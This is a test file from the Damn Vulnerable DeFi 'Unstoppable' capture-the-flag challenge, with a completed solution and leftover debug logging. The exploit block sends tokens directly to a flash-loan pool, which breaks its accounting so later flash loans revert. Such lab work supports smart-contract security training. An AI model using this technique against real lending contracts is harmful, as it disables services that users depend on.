const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();
        console.log('balance is', await deployer.provider.getBalance(deployer.address));
        console.log('balance is', await deployer.provider.getBalance(attacker.address));
        console.log('balance is', await deployer.provider.getBalance(someUser.address));

        console.log('here 1');
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
        console.log('here 2');
        
        this.token = await DamnValuableTokenFactory.deploy();
        console.log('here 3a');
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
        console.log('here 3b');
        
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        console.log('here 4a');
        await this.pool.depositTokens(TOKENS_IN_POOL);
        console.log('here 4b');
        
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        console.log('here 5');
        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);
        console.log('here 6');
        
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
        console.log('here 7');

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
        await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // let DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        // let token = DamnValuableTokenFactory.attach(this.token.address);
        this.token.connect(attacker).transfer(this.pool.address, 10);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
